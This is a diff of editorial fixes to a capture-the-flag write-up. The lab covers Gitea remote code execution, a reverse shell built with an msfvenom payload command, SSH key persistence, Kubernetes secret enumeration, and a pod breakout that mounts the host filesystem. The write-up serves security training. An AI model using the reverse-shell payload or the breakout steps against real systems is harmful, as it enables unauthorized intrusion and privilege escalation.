@@ -35,7 +35,7 @@ PORT      STATE SERVICE           VERSION
 31112/tcp open  ssh               OpenSSH 7.5 (protocol 2.0)
 ```
 
-We can see that ports `6443` and `12050` are open which are typically kubernetes API ports. Port  `30180` is running nginx and `31111` are running another web service. Ports `22` and `31112` are running OpenSSH version 7.6 and 7.5 respectively. Let us enumerate each of these ports.
+We can see that ports `6443` and `12050` are open which are typically kubernetes API ports. Port  `30180` is running nginx and port `31111` is running another web service. Ports `22` and `31112` are running OpenSSH version 7.6 and 7.5 respectively. Let us enumerate each of these ports.
 
 ---
 
@@ -117,7 +117,7 @@ $curl https://<target-ip>:6443/ -k
 
 ### Port 30180
 
-From our nmap scans, we were able to determine that  running on port 30180. Browsing to the target on port 30180 gives us a 403 response.
+From our nmap scans, we were able to determine that a web service is running on port 30180. Sneding a GET request to the target on port 30180 gives us a 403 response.
 
 ```
 $ curl http://<target-ip>:30180/
@@ -165,7 +165,7 @@ Once we have the file password, we can access the contents of the PDF file. We f
 
 ![pdf-unlocked](/img/palsforlife/pdf-unlocked.png)
 
-We haven't found a place where we can use this text yet. Let's enumerate the other ports before we proceed.
+We haven't found a place where we can use this text yet. Let's enumerate the other ports.
 
 ---
 
@@ -181,7 +181,7 @@ While exploring the application, we come across a user named `leeroy` in `/explo
 
 ![Leeroy Logged in](/img/palsforlife/logged_in_leeroy.png)
 
-We have successfully logged into the Gotea application as leeroy. 
+We have successfully logged into the Gitea application as leeroy. 
 
 #### Finding flag 1
 
@@ -199,7 +199,7 @@ Flag 1 can be found as the value of the input tag.
 
 ## Blind RCE of Gitea Application
 
-Looking up exploits for Gitea, we find an RCE at https://www.exploit-db.com/exploits/49383. In order to leverage this exploit, we need to create a payload using msfvenom. 
+Looking up exploits for Gitea, we find an RCE at [https://www.exploit-db.com/exploits/49383](https://www.exploit-db.com/exploits/49383). In order to leverage this exploit, we need to create a payload using msfvenom. 
 
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell
@@ -228,15 +228,17 @@ This will return a reverse shell on the listener as user `git`.
 
 ## Establishing Persistence
 
-The reverse shell is highly unstable and quite slow. It is recommended to enter a `.ssh` directory in `/data/git`, which happens to be the home folder for user git and creating an authorized key file with your SSH public key. 
+The reverse shell is highly unstable and quite slow. It is recommended to enter the `.ssh` directory in `/data/git`, which happens to be the home folder for user git and creating an authorized key file with your SSH public key. 
 
 Now, we can login to the target as git on **port 31112** using this key, allowing us to run commands on a stable shell.
 
 `ssh git@target -p 31112`
 
+---
+
 #### Finding flag 2
 
-Flag 2 can be found in the `/root` folder, which user `git` will have access to. 
+Flag 2 can be found in the `/root` folder, which user `git` has access to. 
 
 ![flag2](/img/palsforlife/flag2.png)
 
@@ -256,7 +258,7 @@ In order to enumerate the pod further, we will need to use [kubectl](https://kub
 
 For this next phase, you could either install kubectl on your machine or download the binary and run it from the target. The installation instructions for kubectl for linux can be found [here](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/). 
 
-> It is also possible to query for information using curl and the API, however this guide uses the kubectl binary. For more information on this, check out https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
+> It is also possible to query for information using curl and the API, however this guide uses the kubectl binary. For more information on this, check out [https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
 
 ### Enumerating the kubernetes pod
 
@@ -270,13 +272,10 @@ In this case we will specify the server as follows: `--server=https://<target-ip
 
 > Be sure to include the `--insecure-skip-tls-verify` to bypass the SSL error.
 
-First we get the various namespaces in the cluster using
-
-`kubectl get namespaces`
-
-This gives us the list of namespaces configured in the cluster
+First we must get the various namespaces in the cluster using
 
 ```
+$ kubectl get namespaces
 NAME              STATUS   AGE
 default           Active   117d
 kube-system       Active   117d
@@ -336,7 +335,7 @@ type: Opaque
 
 ## Privilege Escalation via pod breakout
 
-Using the service token, we should be able to create new pods in the cluster. In order to achieve this, I used the method at this link as reference: https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216
+Using the service token, we should be able to create new pods in the cluster. In order to achieve this, I used the method at this link as reference: [https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216)
 
 First, we will need a yaml file that will define the specifications and behavior of the pod. We can use the following command to find any existing pods and use them as reference. 
 
@@ -354,7 +353,7 @@ We can query for the details of the pod.
 
 `kubectl get pod <name> -n <namespace> -o yaml`
 
-> You can choose whichever pod you want as reference. I used the gitea-0 pod just for convenience.
+> You can choose whichever pod you want as reference. I used the gitea-0 pod for convenience.
 
 Using these details, we can create a yaml file as follows:
 
@@ -384,9 +383,9 @@ spec:
 ]  restartPolicy: Never
 ```
 
-What this is doing is essentially mounting the node's root (/) file system onto /root in the container in this pod. The command is to ensure that the pod stays alive and does not go into "Completed" status.
+What this is doing is essentially mounting the node's root (/) file system onto /root in the container in this pod. The command at the end is to ensure that the pod stays alive and does not go into "Completed" status.
 
-We will name this file attacker.yaml. After this we can create the pod
+We will name this file `attacker.yaml`. After this we can create the pod
 
 `kubectl apply -f attacker.yaml`
 
